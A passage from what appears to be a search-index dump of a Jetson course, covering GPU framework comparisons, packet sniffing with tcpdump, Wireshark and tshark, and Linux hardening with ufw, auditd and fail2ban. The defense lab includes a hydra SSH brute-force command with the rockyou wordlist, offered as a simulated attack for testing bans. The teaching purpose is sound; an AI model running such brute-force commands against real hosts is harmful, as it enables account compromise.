Numba</li> <li>Use case recommendations for each framework</li> <li>Performance scaling analysis</li> <li>Memory usage and efficiency analysis</li> </ol>"},{"location":"curriculum/my_01c_accelerated_computing/#bonus-challenges","title":"Bonus Challenges","text":"<p>\ud83c\udfc6 CUDA Master: Implement a custom CUDA C++ kernel and compare with Numba \ud83c\udfc6 Memory Wizard: Implement and benchmark unified memory vs explicit memory management \ud83c\udfc6 Profiling Expert: Use NVIDIA Nsight Systems to create detailed profiling reports \ud83c\udfc6 Optimization Guru: Achieve &gt;90% of theoretical memory bandwidth in custom kernels \ud83c\udfc6 Framework Innovator: Create a hybrid solution combining multiple frameworks</p>"},{"location":"curriculum/my_01c_accelerated_computing/#lab-assessment-criteria","title":"Lab Assessment Criteria","text":"Criterion Weight Excellent (90-100%) Good (80-89%) Satisfactory (70-79%) Needs Improvement (&lt;70%) Technical Implementation 40% All algorithms implemented correctly with advanced optimizations Most algorithms correct with good optimizations Basic implementations working Incomplete or incorrect implementations Performance Analysis 30% Comprehensive analysis with deep insights and recommendations Good analysis with clear findings Basic analysis with some insights Superficial or incomplete analysis Code Quality 20% Excellent documentation, clean code, proper error handling Good documentation and code structure Adequate documentation Poor documentation or code quality Innovation &amp; Optimization 10% Creative optimizations and novel approaches Some optimization attempts Basic optimizations No optimization efforts"},{"location":"curriculum/my_01c_accelerated_computing/#summary-and-next-steps","title":"Summary and Next Steps","text":"<p>This comprehensive lab has provided you with:</p> <p>\u2705 Deep Understanding: GPU architecture, memory hierarchy, and parallel computing principles \u2705 Practical Skills: Implementation of optimized CUDA kernels and algorithm optimization \u2705 Framework Expertise: Comparative analysis of major GPU computing frameworks \u2705 Profiling Mastery: Advanced performance analysis and optimization techniques \u2705 Real-world Application: Production-ready accelerated computing solutions</p> <p>Key Takeaways: - GPU architecture directly impacts algorithm design and performance - Memory access patterns are crucial for achieving high performance - Different frameworks excel in different use cases - Profiling and measurement are essential for optimization - Theoretical knowledge must be combined with practical implementation</p> <p>Future Exploration: - Advanced CUDA features (cooperative groups, tensor cores) - Multi-GPU programming and scaling - Integration with deep learning frameworks - Real-time systems and low-latency computing - Domain-specific optimizations (computer vision, scientific computing)</p>"},{"location":"curriculum/my_01c_accelerated_computing/#framework-comparison-summary","title":"\ud83d\udccc Framework Comparison Summary","text":"Framework Language Learning Curve Performance Jetson Support Best Use Cases CUDA C++ C++ \u274c Steep \u2705 Maximum \u2705 Native Custom kernels, maximum performance Numba CUDA Python \u2705 Moderate \u2705 Excellent \u2705 Container Mathematical algorithms, prototyping CuPy Python \u2705 Easy \u2705 Very Good \u2705 Container NumPy replacement, scientific computing PyTorch Python \u2705 Easy \u2705 Optimized \u2705 Container Machine learning, tensor operations <p>Jetson Orin Nano provides a complete ecosystem for accelerated computing, from low-level CUDA programming to high-level framework integration, making it ideal for edge AI development and deployment.</p>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/","title":"\ud83e\uddea Packet Sniffing &amp; Monitoring on Linux","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#what-is-a-network-packet","title":"\ud83d\udce6 What Is a Network Packet?","text":"<p>A network packet is the basic unit of data transferred over a network. Each packet contains two main parts:</p> <ul> <li>Header: Metadata like source/destination IP, protocol, port, and more.</li> <li>Payload: Actual data (e.g., part of a file, message, or request).</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#common-protocols-seen-in-packets","title":"\ud83e\uddec Common Protocols Seen in Packets","text":"Protocol Layer Purpose Ethernet Data Link Connect devices on a LAN IP Network Routing between networks TCP/UDP Transport Reliable/fast transport of data HTTP/HTTPS Application Web communication DNS Application Domain name resolution ICMP Network Diagnostics (e.g., ping)"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#tools-for-sniffing-and-monitoring","title":"\ud83d\udee0\ufe0f Tools for Sniffing and Monitoring","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#1-tcpdump-cli-packet-sniffer","title":"1. <code>tcpdump</code> \u2014 CLI Packet Sniffer","text":"<p>A powerful command-line tool to capture and inspect network traffic.</p> <pre><code>sudo apt install tcpdump\nsudo tcpdump -i &lt;interface&gt;\n</code></pre> <p>Common usage:</p> <pre><code>sudo tcpdump -i wlan0\nsudo tcpdump port 80\nsudo tcpdump -w packets.pcap\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#2-wireshark-gui-packet-analyzer","title":"2. <code>wireshark</code> \u2014 GUI Packet Analyzer","text":"<p>Wireshark is a powerful graphical tool used to inspect and analyze network packets in detail.</p> <pre><code>sudo apt install wireshark\n</code></pre> <p>You can run it with:</p> <pre><code>sudo wireshark\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#common-use-cases","title":"\ud83e\uddea Common Use Cases","text":"<ul> <li>Live capture: Choose interface (e.g., wlan0) to monitor live traffic.</li> <li> <p>Filter traffic using expressions:</p> </li> <li> <p><code>http</code> (HTTP only)</p> </li> <li><code>ip.addr == 192.168.1.10</code></li> <li><code>tcp.port == 22</code></li> <li>Follow TCP stream to reconstruct conversations</li> <li>Inspect packet structure: Ethernet, IP, TCP, and payload layers</li> </ul> <p>\ud83d\udd10 Tip: If permissions issue occurs, ensure your user is in the <code>wireshark</code> group:</p> <pre><code>sudo usermod -aG wireshark $USER\nnewgrp wireshark\n</code></pre> <p>Wireshark can also open <code>.pcap</code> files captured via <code>tcpdump</code>, allowing post-capture analysis with GUI.</p>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#3-iftop-real-time-bandwidth-monitor","title":"3. <code>iftop</code> \u2014 Real-Time Bandwidth Monitor","text":"<p>Displays top bandwidth-consuming connections.</p> <pre><code>sudo apt install iftop\nsudo iftop -i wlan0\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#4-nethogs-bandwidth-by-process","title":"4. <code>nethogs</code> \u2014 Bandwidth by Process","text":"<p>Shows which local processes use network bandwidth.</p> <pre><code>sudo apt install nethogs\nsudo nethogs wlan0\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#5-netstat-ss-socket-info","title":"5. <code>netstat</code> / <code>ss</code> \u2014 Socket Info","text":"<p>Inspect current open ports and connections.</p> <pre><code>ss -tulnp\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#ethical-use-and-legal-reminder","title":"\ud83d\udd10 Ethical Use and Legal Reminder","text":"<ul> <li>Only sniff packets on your own network.</li> <li>Avoid collecting sensitive data without permission.</li> <li>Use for learning, debugging, and securing your systems.</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#advanced-lab-jetson-network-analysis-protocol-understanding","title":"\ud83e\uddea Advanced Lab: Jetson Network Analysis &amp; Protocol Understanding","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#objectives","title":"\ud83c\udfaf Objectives","text":"<ol> <li>Use Jetson-optimized tools for network packet analysis</li> <li>Run Wireshark in containerized environment without sudo privileges</li> <li>Understand network protocols through practical packet inspection</li> <li>Implement automated network monitoring solutions</li> </ol>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#jetson-specific-setup","title":"\u2705 Jetson-Specific Setup","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#prerequisites","title":"Prerequisites","text":"<pre><code># Update system and install Docker (if not already installed)\nsudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt install docker.io docker-compose -y\nsudo usermod -aG docker $USER\n# Logout and login again for group changes to take effect\n\n# Install additional network tools\nsudo apt install tcpdump iftop nethogs nmap tshark -y\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#network-interface-configuration","title":"Network Interface Configuration","text":"<pre><code># Check available network interfaces\nip link show\n\n# For Jetson devices, common interfaces:\n# - eth0: Ethernet\n# - wlan0: WiFi (if WiFi module present)\n# - docker0: Docker bridge\n# - l4tbr0: Jetson-specific bridge\n\n# Enable promiscuous mode for packet capture (if needed)\nsudo ip link set wlan0 promisc on\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#containerized-wireshark-setup-no-sudo-required","title":"\ud83d\udc33 Containerized Wireshark Setup (No Sudo Required)","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#method-1-x11-forwarding-with-docker","title":"Method 1: X11 Forwarding with Docker","text":"<pre><code># Create Wireshark container with X11 support\ndocker run -it --rm \\\n  --name wireshark-jetson \\\n  --net=host \\\n  --privileged \\\n  -e DISPLAY=$DISPLAY \\\n  -v /tmp/.X11-unix:/tmp/.X11-unix:rw \\\n  -v $(pwd)/captures:/captures \\\n  linuxserver/wireshark:latest\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#method-2-web-based-wireshark","title":"Method 2: Web-based Wireshark","text":"<pre><code># Run Wireshark with web interface\ndocker run -d \\\n  --name wireshark-web \\\n  --net=host \\\n  --privileged \\\n  -p 3000:3000 \\\n  -v $(pwd)/captures:/captures \\\n  -e PUID=1000 \\\n  -e PGID=1000 \\\n  linuxserver/wireshark:latest\n\n# Access via browser: http://jetson-ip:3000\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#method-3-custom-jetson-wireshark-container","title":"Method 3: Custom Jetson Wireshark Container","text":"<pre><code># Dockerfile.wireshark-jetson\nFROM ubuntu:20.04\n\nENV DEBIAN_FRONTEND=noninteractive\n\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    wireshark \\\n    tshark \\\n    tcpdump \\\n    net-tools \\\n    iputils-ping \\\n    curl \\\n    wget \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# Add non-root user to wireshark group\nRUN groupadd -r wireshark &amp;&amp; \\\n    useradd -r -g wireshark -s /bin/bash wireshark &amp;&amp; \\\n    usermod -a -G wireshark wireshark\n\n# Set capabilities for non-root packet capture\nRUN setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap\n\nUSER wireshark\nWORKDIR /home/wireshark\n\nCMD [\"/bin/bash\"]\n</code></pre> <pre><code># Build and run custom container\ndocker build -f Dockerfile.wireshark-jetson -t jetson-wireshark .\n\ndocker run -it --rm \\\n  --name jetson-wireshark \\\n  --net=host \\\n  --cap-add=NET_RAW \\\n  --cap-add=NET_ADMIN \\\n  -v $(pwd)/captures:/home/wireshark/captures \\\n  jetson-wireshark\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#advanced-packet-analysis-tasks","title":"\ud83d\udee0\ufe0f Advanced Packet Analysis Tasks","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#task-1-multi-interface-monitoring","title":"Task 1: Multi-Interface Monitoring","text":"<pre><code># Monitor multiple interfaces simultaneously\n# Terminal 1: Ethernet traffic\nsudo tcpdump -i eth0 -w eth0_capture.pcap &amp;\n\n# Terminal 2: WiFi traffic (if available)\nsudo tcpdump -i wlan0 -w wlan0_capture.pcap &amp;\n\n# Terminal 3: Docker bridge traffic\nsudo tcpdump -i docker0 -w docker_capture.pcap &amp;\n\n# Let it run for 2-3 minutes, then stop all captures\nsudo pkill tcpdump\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#task-2-protocol-specific-analysis","title":"Task 2: Protocol-Specific Analysis","text":"<pre><code># Capture specific protocols\n\n# 1. HTTP/HTTPS traffic analysis\nsudo tcpdump -i any 'port 80 or port 443' -w web_traffic.pcap -c 100\n\n# 2. DNS queries and responses\nsudo tcpdump -i any 'port 53' -w dns_traffic.pcap -c 50\n\n# 3. SSH connections\nsudo tcpdump -i any 'port 22' -w ssh_traffic.pcap -c 30\n\n# 4. IoT device communication (common ports)\nsudo tcpdump -i any 'port 1883 or port 8883 or port 5683' -w iot_traffic.pcap -c 100\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#task-3-real-time-protocol-analysis-with-tshark","title":"Task 3: Real-time Protocol Analysis with tshark","text":"<pre><code># Real-time protocol statistics\ntshark -i any -q -z conv,ip -a duration:60\n\n# Real-time HTTP analysis\ntshark -i any -Y \"http\" -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri\n\n# Real-time DNS analysis\ntshark -i any -Y \"dns\" -T fields -e ip.src -e dns.qry.name -e dns.resp.addr\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#network-protocol-understanding-exercises","title":"\ud83d\udcca Network Protocol Understanding Exercises","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#exercise-1-tcp-three-way-handshake-analysis","title":"Exercise 1: TCP Three-Way Handshake Analysis","text":"<pre><code># Capture TCP handshake\nsudo tcpdump -i any 'tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0' -w handshake.pcap -c 20\n\n# Generate some TCP connections\ncurl -s http://httpbin.org/get &gt; /dev/null\nwget -q -O /dev/null http://httpbin.org/json\n</code></pre> <p>Wireshark Analysis Steps: 1. Open <code>handshake.pcap</code> in Wireshark 2. Filter: <code>tcp.flags.syn==1</code> 3. Follow TCP stream for complete handshake 4. Identify: SYN \u2192 SYN-ACK \u2192 ACK sequence 5. Note sequence numbers and window sizes</p>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#exercise-2-http-vs-https-traffic-comparison","title":"Exercise 2: HTTP vs HTTPS Traffic Comparison","text":"<pre><code># Capture mixed HTTP/HTTPS traffic\nsudo tcpdump -i any 'port 80 or port 443' -w http_vs_https.pcap &amp;\n\n# Generate HTTP traffic\ncurl -s http://httpbin.org/user-agent\ncurl -s http://httpbin.org/headers\n\n# Generate HTTPS traffic\ncurl -s https://httpbin.org/user-agent\ncurl -s https://httpbin.org/headers\n\nsudo pkill tcpdump\n</code></pre> <p>Analysis Questions: 1. Can you read HTTP request headers in plaintext? 2. What do you see in HTTPS packets after the TLS handshake? 3. Compare packet sizes between HTTP and HTTPS 4. Identify TLS version and cipher suites used</p>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#exercise-3-dns-resolution-deep-dive","title":"Exercise 3: DNS Resolution Deep Dive","text":"<pre><code># Capture DNS traffic\nsudo tcpdump -i any 'port 53' -w dns_analysis.pcap &amp;\n\n# Generate various DNS queries\nnslookup google.com\nnslookup -type=MX google.com\nnslookup -type=AAAA google.com\ndig @8.8.8.8 nvidia.com\ndig @1.1.1.1 jetson.nvidia.com\n\nsudo pkill tcpdump\n</code></pre> <p>Wireshark Analysis: 1. Filter: <code>dns</code> 2. Examine query types (A, AAAA, MX, etc.) 3. Compare response times from different DNS servers 4. Identify recursive vs iterative queries 5. Look for DNS over HTTPS (DoH) traffic on port 443</p>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#advanced-monitoring-scripts","title":"\ud83d\udd0d Advanced Monitoring Scripts","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#automated-network-monitoring-script","title":"Automated Network Monitoring Script","text":"<pre><code>#!/usr/bin/env python3\n# jetson_network_monitor.py\n\nimport subprocess\nimport time\nimport json\nimport psutil\nfrom datetime import datetime\nimport threading\n\nclass JetsonNetworkMonitor:\n    def __init__(self, interface=\"any\", capture_duration=300):\n        self.interface = interface\n        self.capture_duration = capture_duration\n        self.stats = {\n            \"protocols\": {},\n            \"top_talkers\": {},\n            \"bandwidth_usage\": [],\n            \"start_time\": datetime.now().isoformat()\n        }\n\n    def capture_packets(self, output_file):\n        \"\"\"Capture packets using tcpdump\"\"\"\n        cmd = [\n            \"sudo\", \"tcpdump\", \"-i\", self.interface,\n            \"-w\", output_file,\n            \"-G\", str(self.capture_duration),\n            \"-W\", \"1\"\n        ]\n\n        try:\n            subprocess.run(cmd, timeout=self.capture_duration + 10)\n        except subprocess.TimeoutExpired:\n            print(\"Capture completed\")\n\n    def analyze_protocols(self, pcap_file):\n        \"\"\"Analyze protocols using tshark\"\"\"\n        cmd = [\n            \"tshark\", \"-r\", pcap_file,\n            \"-q\", \"-z\", \"prot,colinfo\"\n        ]\n\n        try:\n            result = subprocess.run(cmd, capture_output=True, text=True)\n            # Parse protocol statistics\n            for line in result.stdout.split('\\n'):\n                if line.strip() and not line.startswith('='):\n                    parts = line.split()\n                    if len(parts) &gt;= 2:\n                        protocol = parts[0]\n                        count = parts[1]\n                        self.stats[\"protocols\"][protocol] = int(count)\n        except Exception as e:\n            print(f\"Protocol analysis error: {e}\")\n\n    def monitor_bandwidth(self):\n        \"\"\"Monitor real-time bandwidth usage\"\"\"\n        start_time = time.time()\n\n        while time.time() - start_time &lt; self.capture_duration:\n            net_io = psutil.net_io_counters()\n            timestamp = datetime.now().isoformat()\n\n            self.stats[\"bandwidth_usage\"].append({\n                \"timestamp\": timestamp,\n                \"bytes_sent\": net_io.bytes_sent,\n                \"bytes_recv\": net_io.bytes_recv,\n                \"packets_sent\": net_io.packets_sent,\n                \"packets_recv\": net_io.packets_recv\n            })\n\n            time.sleep(5)  # Sample every 5 seconds\n\n    def get_top_talkers(self, pcap_file):\n        \"\"\"Identify top talking hosts\"\"\"\n        cmd = [\n            \"tshark\", \"-r\", pcap_file,\n            \"-q\", \"-z\", \"conv,ip\"\n        ]\n\n        try:\n            result = subprocess.run(cmd, capture_output=True, text=True)\n            # Parse conversation statistics\n            lines = result.stdout.split('\\n')\n            for line in lines:\n                if '&lt;-&gt;' in line:\n                    parts = line.split()\n                    if len(parts) &gt;= 6:\n                        src_ip = parts[0]\n                        dst_ip = parts[2]\n                        bytes_total = parts[4]\n\n                        conversation = f\"{src_ip} &lt;-&gt; {dst_ip}\"\n                        self.stats[\"top_talkers\"][conversation] = bytes_total\n        except Exception as e:\n            print(f\"Top talkers analysis error: {e}\")\n\n    def run_monitoring(self):\n        \"\"\"Run complete monitoring session\"\"\"\n        print(f\"Starting network monitoring on {self.interface} for {self.capture_duration} seconds...\")\n\n        # Start bandwidth monitoring in background\n        bandwidth_thread = threading.Thread(target=self.monitor_bandwidth)\n        bandwidth_thread.start()\n\n        # Capture packets\n        pcap_file = f\"jetson_capture_{int(time.time())}.pcap\"\n        self.capture_packets(pcap_file)\n\n        # Wait for bandwidth monitoring to complete\n        bandwidth_thread.join()\n\n        # Analyze captured data\n        print(\"Analyzing captured packets...\")\n        self.analyze_protocols(pcap_file)\n        self.get_top_talkers(pcap_file)\n\n        # Save results\n        results_file = f\"network_analysis_{int(time.time())}.json\"\n        with open(results_file, 'w') as f:\n            json.dump(self.stats, f, indent=2)\n\n        print(f\"Analysis complete. Results saved to {results_file}\")\n        print(f\"Packet capture saved to {pcap_file}\")\n\n        return self.stats\n\nif __name__ == \"__main__\":\n    monitor = JetsonNetworkMonitor(interface=\"any\", capture_duration=60)\n    results = monitor.run_monitoring()\n\n    print(\"\\n=== Network Analysis Summary ===\")\n    print(f\"Protocols detected: {list(results['protocols'].keys())}\")\n    print(f\"Total conversations: {len(results['top_talkers'])}\")\n    print(f\"Monitoring duration: {len(results['bandwidth_usage']) * 5} seconds\")\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#real-time-protocol-dashboard","title":"Real-time Protocol Dashboard","text":"<pre><code>#!/usr/bin/env python3\n# protocol_dashboard.py\n\nimport subprocess\nimport time\nimport curses\nfrom collections import defaultdict, deque\nimport threading\n\nclass ProtocolDashboard:\n    def __init__(self, interface=\"any\"):\n        self.interface = interface\n        self.protocol_counts = defaultdict(int)\n        self.packet_history = deque(maxlen=100)\n        self.running = True\n\n    def packet_capture_worker(self):\n        \"\"\"Background packet capture and analysis\"\"\"\n        cmd = [\n            \"sudo\", \"tshark\", \"-i\", self.interface,\n            \"-T\", \"fields\", \"-e\", \"frame.protocols\",\n            \"-l\"  # Line buffered output\n        ]\n\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, \n                                 stderr=subprocess.PIPE, text=True)\n\n        while self.running:\n            try:\n                line = process.stdout.readline()\n                if line:\n                    protocols = line.strip().split(':')\n                    for protocol in protocols:\n                        if protocol:\n                            self.protocol_counts[protocol] += 1\n\n                    self.packet_history.append({\n                        'timestamp': time.time(),\n                        'protocols': protocols\n                    })\n            except Exception as e:\n                break\n\n        process.terminate()\n\n    def display_dashboard(self, stdscr):\n        \"\"\"Display real-time dashboard using curses\"\"\"\n        curses.curs_set(0)  # Hide cursor\n        stdscr.nodelay(1)   # Non-blocking input\n\n        # Start packet capture in background\n        capture_thread = threading.Thread(target=self.packet_capture_worker)\n        capture_thread.daemon = True\n        capture_thread.start()\n\n        while True:\n            stdscr.clear()\n\n            # Header\n            stdscr.addstr(0, 0, \"Jetson Network Protocol Dashboard\", curses.A_BOLD)\n            stdscr.addstr(1, 0, f\"Interface: {self.interface}\", curses.A_UNDERLINE)\n            stdscr.addstr(2, 0, f\"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\")\n            stdscr.addstr(3, 0, \"-\" * 60)\n\n            # Protocol statistics\n            stdscr.addstr(4, 0, \"Protocol Statistics:\", curses.A_BOLD)\n            row = 5\n\n            # Sort protocols by count\n            sorted_protocols = sorted(self.protocol_counts.items(), \n                                    key=lambda x: x[1], reverse=True)\n\n            for protocol, count in sorted_protocols[:15]:  # Top 15\n                bar_length = min(40, count // 10) if count &gt; 0 else 0\n                bar = \"\u2588\" * bar_length\n                stdscr.addstr(row, 0, f\"{protocol:15} {count:6} {bar}\")\n                row += 1\n\n            # Recent activity\n            stdscr.addstr(row + 1, 0, \"Recent Activity:\", curses.A_BOLD)\n            recent_packets = list(self.packet_history)[-10:]  # Last 10 packets\n\n            for i, packet in enumerate(recent_packets):\n                timestamp = time.strftime('%H:%M:%S', \n                                        time.localtime(packet['timestamp']))\n                protocols_str = ' -&gt; '.join(packet['protocols'][:5])  # First 5 protocols\n                stdscr.addstr(row + 2 + i, 0, f\"{timestamp}: {protocols_str}\")\n\n            stdscr.addstr(row + 13, 0, \"Press 'q' to quit\", curses.A_DIM)\n            stdscr.refresh()\n\n            # Check for quit\n            key = stdscr.getch()\n            if key == ord('q'):\n                self.running = False\n                break\n\n            time.sleep(1)\n\ndef main():\n    dashboard = ProtocolDashboard()\n    curses.wrapper(dashboard.display_dashboard)\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#comprehensive-lab-deliverables","title":"\ud83d\udccb Comprehensive Lab Deliverables","text":""},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#part-1-container-setup-20-points","title":"Part 1: Container Setup (20 points)","text":"<ul> <li> Successfully run Wireshark in Docker container without sudo</li> <li> Capture packets from at least 2 different network interfaces</li> <li> Screenshot of containerized Wireshark interface</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#part-2-protocol-analysis-30-points","title":"Part 2: Protocol Analysis (30 points)","text":"<ul> <li> Analyze TCP three-way handshake with sequence numbers</li> <li> Compare HTTP vs HTTPS packet contents</li> <li> Identify at least 5 different protocols in your captures</li> <li> Document DNS resolution process with timing analysis</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#part-3-advanced-monitoring-25-points","title":"Part 3: Advanced Monitoring (25 points)","text":"<ul> <li> Run the automated monitoring script for 5 minutes</li> <li> Generate network analysis JSON report</li> <li> Identify top 3 network conversations</li> <li> Create protocol distribution chart</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#part-4-real-time-dashboard-15-points","title":"Part 4: Real-time Dashboard (15 points)","text":"<ul> <li> Run the protocol dashboard for 2 minutes</li> <li> Screenshot showing real-time protocol statistics</li> <li> Document any unusual or interesting traffic patterns</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#part-5-security-analysis-10-points","title":"Part 5: Security Analysis (10 points)","text":"<ul> <li> Identify any unencrypted sensitive data in captures</li> <li> Document potential security concerns observed</li> <li> Suggest improvements for network security</li> </ul>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#advanced-challenge-iot-device-analysis","title":"\ud83c\udfaf Advanced Challenge: IoT Device Analysis","text":"<p>Scenario: Your Jetson is connected to a network with various IoT devices.</p> <p>Tasks: 1. Identify IoT devices by their traffic patterns 2. Analyze MQTT, CoAP, or other IoT protocols 3. Create a device fingerprinting report 4. Implement automated anomaly detection</p> <p>Bonus: Integrate with NVIDIA DeepStream for AI-powered network analysis</p>"},{"location":"curriculum/my_03b_packet_sniffing_monitoring/#report-template","title":"\ud83d\udcdd Report Template","text":"<pre><code># Jetson Network Analysis Report\n\n## Executive Summary\n- Monitoring duration: X minutes\n- Total packets captured: X\n- Unique protocols identified: X\n- Security findings: X\n\n## Network Overview\n- Primary interface: \n- IP configuration:\n- Gateway and DNS servers:\n\n## Protocol Analysis\n### Most Common Protocols\n1. Protocol A (X% of traffic)\n2. Protocol B (X% of traffic)\n3. Protocol C (X% of traffic)\n\n### Interesting Findings\n- Unusual protocols detected:\n- Potential security concerns:\n- Performance bottlenecks:\n\n## Container Performance\n- Wireshark container resource usage:\n- Capture performance comparison:\n- Recommendations:\n\n## Conclusions and Recommendations\n- Network optimization suggestions:\n- Security improvements:\n- Future monitoring strategies:\n</code></pre> <p>This comprehensive lab provides hands-on experience with advanced network analysis on Jetson devices, emphasizing containerized tools, protocol understanding, and practical security analysis.</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/","title":"\ud83d\udee1\ufe0f 01d: Advanced Linux Cyber Defense on Jetson","text":"<p>This module introduces comprehensive cyber defense concepts specifically tailored for Jetson devices, covering containerized security tools, advanced threat detection, and edge-specific hardening techniques. Students will learn to implement robust cybersecurity measures using container-based approaches that don't require sudo access.</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#learning-objectives","title":"\ud83c\udfaf Learning Objectives","text":"<ul> <li>Master advanced cyber defense strategies on Jetson Linux systems</li> <li>Implement containerized security tools: <code>ufw</code>, <code>iptables</code>, <code>auditd</code>, <code>fail2ban</code>, <code>chkrootkit</code>, etc.</li> <li>Deploy edge-specific threat detection and monitoring systems</li> <li>Practice defensive monitoring and system hardening in container environments</li> <li>Understand IoT/Edge device security challenges and mitigation strategies</li> <li>Implement automated security monitoring and incident response</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#basic-security-concepts","title":"\ud83e\uddf1 Basic Security Concepts","text":"Concept Description Principle of Least Privilege Only grant minimal necessary access to users/programs System Hardening Reduce attack surface by disabling unused services, setting strong permissions Logging &amp; Auditing Track changes, log events, monitor system activities Real-Time Protection Monitor services, detect intrusions, block malicious behavior"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#core-linux-defense-tools","title":"\ud83d\udd27 Core Linux Defense Tools","text":"<p>ufw, fail2ban, and auditd (which require host-level access or systemd)</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#1-ufw-uncomplicated-firewall","title":"\ud83d\udd12 1. <code>ufw</code> \u2013 Uncomplicated Firewall","text":"<pre><code>sudo apt install ufw\nsudo ufw enable\nsudo ufw allow ssh\nsudo ufw status verbose\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#2-iptables-advanced-packet-filtering-optional-advanced","title":"\ud83d\udd25 2. <code>iptables</code> \u2013 Advanced Packet Filtering (optional, advanced)","text":"<pre><code>sudo iptables -L\nsudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT\nsudo iptables -A INPUT -j DROP\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#3-auditd-audit-daemon","title":"\ud83d\udcdc 3. <code>auditd</code> \u2013 Audit Daemon","text":"<pre><code>sudo apt install auditd audispd-plugins\nsudo systemctl start auditd\nsudo auditctl -w /etc/passwd -p war -k passwd_monitor\nsudo ausearch -k passwd_monitor\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#4-fail2ban-prevent-brute-force-logins","title":"\ud83d\udeab 4. <code>fail2ban</code> \u2013 Prevent Brute Force Logins","text":"<pre><code>sudo apt install fail2ban\nsudo systemctl start fail2ban\nsudo systemctl status fail2ban\n</code></pre> <ul> <li>Config file: <code>/etc/fail2ban/jail.conf</code></li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#5-chkrootkit-rootkit-scanner","title":"\ud83e\uddea 5. <code>chkrootkit</code> \u2013 Rootkit Scanner","text":"<pre><code>sudo apt install chkrootkit\nsudo chkrootkit\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#6-clamav-open-source-antivirus","title":"\ud83e\udde0 6. <code>clamav</code> \u2013 Open-Source Antivirus","text":"<pre><code>sudo apt install clamav\nsudo freshclam  # update definitions\nsudo clamscan -r /home\n</code></pre>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#system-monitoring-tools","title":"\ud83d\udd0d System Monitoring Tools","text":"Tool Use <code>top</code>, <code>htop</code> View running processes <code>netstat</code>, <code>ss</code> View open network connections <code>who</code>, <code>w</code> Who is logged in <code>journalctl</code> System logs <code>ps aux</code> View all running processes"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#lab-harden-and-monitor-a-jetson-device","title":"\ud83d\udce6 Lab: Harden and Monitor a Jetson Device","text":""},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#objective","title":"Objective:","text":"<p>Set up basic cyber defense on a Jetson Linux device and test protections.</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#step-by-step","title":"Step-by-Step:","text":"<ol> <li>Update and Harden:</li> </ol> <pre><code>sudo apt update &amp;&amp; sudo apt upgrade\nsudo ufw enable &amp;&amp; sudo ufw allow ssh\n</code></pre> <ol> <li>Install and Configure <code>fail2ban</code>:</li> </ol> <pre><code>sudo apt install fail2ban\n</code></pre> <ol> <li>Simulate SSH brute force attack (from another machine):</li> </ol> <pre><code>hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://&lt;JETSON-IP&gt;\n</code></pre> <p>Monitor ban via:</p> <pre><code>sudo fail2ban-client status 